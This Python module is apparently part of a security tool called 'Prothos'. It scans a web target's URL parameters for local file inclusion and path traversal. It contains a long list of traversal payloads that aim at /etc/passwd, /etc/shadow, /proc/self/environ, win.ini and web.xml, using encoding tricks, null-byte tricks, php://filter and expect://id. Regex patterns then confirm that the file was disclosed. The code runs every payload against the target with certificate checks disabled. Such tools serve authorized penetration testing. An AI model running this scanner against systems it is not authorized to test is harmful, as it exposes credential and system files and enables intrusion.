import asyncio
import json
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

console = Console()

LFI_PAYLOADS: list[str] = [
    "/etc/passwd", "/etc/hosts", "/etc/shadow", "/proc/self/environ",
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd", "../../../../../../../../../../etc/passwd",
    "....//....//etc/passwd", "....//....//....//etc/passwd",
    "..//..//..//etc/passwd", "..///..///..///etc/passwd",
    "..%2fetc%2fpasswd", "..%2f..%2fetc%2fpasswd", "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252fetc%252fpasswd", "..%252f..%252fetc%252fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%c0%afetc%c0%afpasswd", "..%c1%9cetc%c1%9cpasswd",
    "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
    "....\\....\\etc\\passwd",
    "..%5c..%5cetc%5cpasswd", "%2e%2e%5c%2e%2e%5cetc%5cpasswd",
    "/etc/passwd%00", "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
    "/etc/passwd\x00", "../../../etc/passwd\x00.png",
    "....//....//....//....//etc/passwd%00",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "file:///etc/passwd", "file://localhost/etc/passwd",
    "expect://id", "/proc/self/cmdline", "/proc/version", "/proc/self/status",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "../../../../../../Windows/System32/drivers/etc/hosts",
    "..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts",
    "C:\\Windows\\win.ini", "..\\..\\..\\Windows\\win.ini",
    "../../../../../../../../Windows/win.ini",
    "%SYSTEMROOT%\\win.ini", "C:/Windows/win.ini",
    "..%2f..%2f..%2f..%2fboot.ini", "/WEB-INF/web.xml", "../WEB-INF/web.xml",
    "....//....//....//....//....//etc/passwd",
]

DETECTION_PATTERNS: list[tuple[str, str]] = [
    (r"root:.*?:0:0:", "/etc/passwd (root entry)"),
    (r"daemon:.*?:/usr/sbin", "/etc/passwd (daemon)"),
    (r"(?:bin|nobody|www-data|sshd):x?:\d+:\d+:", "/etc/passwd (user entry)"),
    (r"127\.0\.0\.1\s+localhost", "/etc/hosts"),
    (r"::1\s+localhost", "/etc/hosts (ipv6)"),
    (r"\[(?:fonts|extensions|mci extensions|files)\]", "win.ini"),
    (r"\[boot loader\]", "boot.ini"),
    (r"for 16-bit app support", "win.ini (legacy)"),
    (r"<web-app", "WEB-INF/web.xml"),
    (r"DOCUMENT_ROOT=|HTTP_USER_AGENT=|PATH=/usr", "/proc/self/environ"),
    (r"Linux version \d", "/proc/version"),
    (r"^[A-Za-z0-9+/]{200,}={0,2}$", "php://filter base64 output"),
]

SEVERITY_COLOR = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "dim",
    "info":     "cyan",
}


@dataclass
class LFIFinding:
    url:        str
    param:      str
    payload:    str
    file_hit:   str
    status:     int          = 0
    evidence:   str          = ""
    severity:   str          = "critical"

    def to_dict(self) -> dict:
        return self.__dict__.copy()


@dataclass
class LFIReport:
    target:      str
    started_at:  str                  = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    finished_at: Optional[str]       = None
    params:      list[str]           = field(default_factory=list)
    total:       int                 = 0
    findings:    list[LFIFinding]    = field(default_factory=list)
    errors:      list[str]           = field(default_factory=list)

    @property
    def critical(self) -> list[LFIFinding]:
        return [f for f in self.findings if f.severity == "critical"]

    def to_dict(self) -> dict:
        d = self.__dict__.copy()
        d["findings"] = [f.to_dict() for f in self.findings]
        return d


def _set_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True, safe="/%\\.:")))


def _candidate_params(url: str, extra: Optional[list[str]]) -> list[str]:
    params = list(parse_qs(urlparse(url).query).keys())
    if extra:
        for p in extra:
            if p not in params:
                params.append(p)
    if not params:
        params = ["file", "page", "path"]
    return params


def _match(body: str) -> Optional[tuple[str, str]]:
    for pat, label in DETECTION_PATTERNS:
        m = re.search(pat, body, re.IGNORECASE | re.MULTILINE)
        if m:
            return label, m.group(0)[:120]
    return None


async def _test_param(client, url, param, baseline_body, sem) -> list[LFIFinding]:
    findings = []
    async with sem:
        for payload in LFI_PAYLOADS:
            try:
                r = await client.get(_set_param(url, param, payload), timeout=12)
            except Exception:
                continue
            hit = _match(r.text)
            if hit and (hit[1] not in baseline_body):
                label, evidence = hit
                f = LFIFinding(url=url, param=param, payload=payload, file_hit=label,
                               status=r.status_code, evidence=evidence, severity="critical")
                findings.append(f)
                _print_finding(f)
                return findings
    return findings


async def _baseline(client, url, param) -> str:
    try:
        r = await client.get(_set_param(url, param, "prothos_baseline"), timeout=12)
        return r.text[:20000]
    except Exception:
        return ""


async def _scan_param(client, url, param, sem) -> list[LFIFinding]:
    base = await _baseline(client, url, param)
    return await _test_param(client, url, param, base, sem)


def _print_finding(f: LFIFinding):
    color = SEVERITY_COLOR.get(f.severity, "white")
    console.print(
        f"  [{color}][{f.severity.upper()}][/{color}] "
        f"[bold white]{f.param}[/bold white] → "
        f"[yellow]{f.file_hit}[/yellow]  "
        f"[dim]payload: {f.payload[:45]}[/dim]"
    )


def _display(report: LFIReport):
    console.print()
    console.print(Panel(
        f"[bold white]{report.target}[/bold white]  "
        f"[dim]params:[/dim] {len(report.params)}  "
        f"[dim]requests:[/dim] {report.total}  "
        f"[dim]findings:[/dim] [yellow]{len(report.findings)}[/yellow]  "
        f"[dim]critical:[/dim] [red]{len(report.critical)}[/red]",
        title="[bold red]LFI / Path Traversal — Summary[/bold red]",
        border_style="red",
    ))

    if not report.findings:
        console.print("[dim]    No LFI found.[/dim]\n")
        return

    table = Table(show_header=True, header_style="bold red", border_style="dim")
    table.add_column("Severity",  width=10)
    table.add_column("Param",     style="bold white", width=14)
    table.add_column("File",      style="cyan", width=24)
    table.add_column("Status",    style="dim", width=7)
    table.add_column("Payload",   style="yellow", min_width=30)

    for f in report.findings:
        color = SEVERITY_COLOR.get(f.severity, "white")
        table.add_row(
            f"[{color}]{f.severity}[/{color}]",
            f.param, f.file_hit, str(f.status) if f.status else "-", f.payload[:45],
        )

    console.print(table)
    console.print()


async def _lfi_async(target, extra_params, concurrency, proxy) -> LFIReport:
    report = LFIReport(target=target)
    params = _candidate_params(target, extra_params)
    report.params = params
    report.total  = len(params) * len(LFI_PAYLOADS)
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=True,
        proxy=proxy,
        headers={"User-Agent": "Mozilla/5.0 (compatible; Prothos/1.0)"},
    ) as client:

        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[bold white]{task.description}"),
            BarColumn(bar_width=35, style="red", complete_style="green"),
            TextColumn("[green]{task.completed}[/green]/[white]{task.total}[/white]"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task_id = progress.add_task("Scanning LFI...", total=len(params))
            tasks = [_scan_param(client, target, p, sem) for p in params]
            for coro in asyncio.as_completed(tasks):
                report.findings.extend(await coro)
                progress.advance(task_id, 1)

    report.finished_at = datetime.now(timezone.utc).isoformat()
    return report


def run_lfi_scan(
    target:        str,
    params:        Optional[list[str]] = None,
    concurrency:   int                 = 10,
    proxy:         Optional[str]       = None,
    save_json:     Optional[str]       = None,
) -> LFIReport:

    console.print(f"\n[bold red][*][/bold red] LFI / Path Traversal → [bold white]{target}[/bold white]")
    detected = _candidate_params(target, params)
    console.print(f"[dim]    Params: {', '.join(detected)}  "
                  f"Payloads: {len(LFI_PAYLOADS)}[/dim]")

    report = asyncio.run(_lfi_async(
        target=target,
        extra_params=params,
        concurrency=concurrency,
        proxy=proxy,
    ))

    _display(report)

    if save_json:
        try:
            with open(save_json, "w") as f:
                json.dump(report.to_dict(), f, indent=2, default=str)
            console.print(f"[dim][+] Saved to {save_json}[/dim]")
        except OSError as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")

    return report
